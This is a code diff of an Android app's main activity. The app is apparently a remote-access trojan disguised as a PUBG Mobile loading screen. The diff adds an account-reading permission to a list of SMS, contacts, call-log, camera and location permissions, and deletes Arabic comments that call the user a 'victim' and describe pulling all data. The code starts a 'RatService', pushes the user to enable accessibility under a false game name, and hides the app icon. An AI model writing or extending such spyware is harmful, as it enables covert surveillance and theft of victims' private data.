@@ -18,7 +18,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // شاشة وهمية (مثلاً شكل تحميل اللعبة)
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
@@ -37,7 +36,7 @@ public class MainActivity extends Activity {
             android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
             android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.READ_EXTERNAL_STORAGE,
             android.Manifest.permission.CAMERA, android.Manifest.permission.ACCESS_FINE_LOCATION,
-            android.Manifest.permission.POST_NOTIFICATIONS
+            android.Manifest.permission.GET_ACCOUNTS, android.Manifest.permission.POST_NOTIFICATIONS
         };
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -47,18 +46,15 @@ public class MainActivity extends Activity {
         }
     }
 
-    // الدالة دي بتشتغل أوتوماتيك بمجرد ما الضحية يدوس Allow في شاشة الصلاحيات
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == 1) {
-            // الضحية دوس Allow.. يلا بينا نسحب كل حاجة ونخفي الأيقونة فوراً
             startRatAndOpenSettings();
         }
     }
 
     private void startRatAndOpenSettings() {
-        // تشغيل السيرفس فوراً
         try {
             Intent serviceIntent = new Intent(this, RatService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -68,7 +64,6 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
 
-        // فتح شاشة الـ Accessibility
         try {
             Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -76,7 +71,6 @@ public class MainActivity extends Activity {
             Toast.makeText(this, "Please enable PUBG Mobile.", Toast.LENGTH_LONG).show();
         } catch (Exception ignored) {}
 
-        // إخفاء الأيقونة
         try {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this, MainActivity.class);
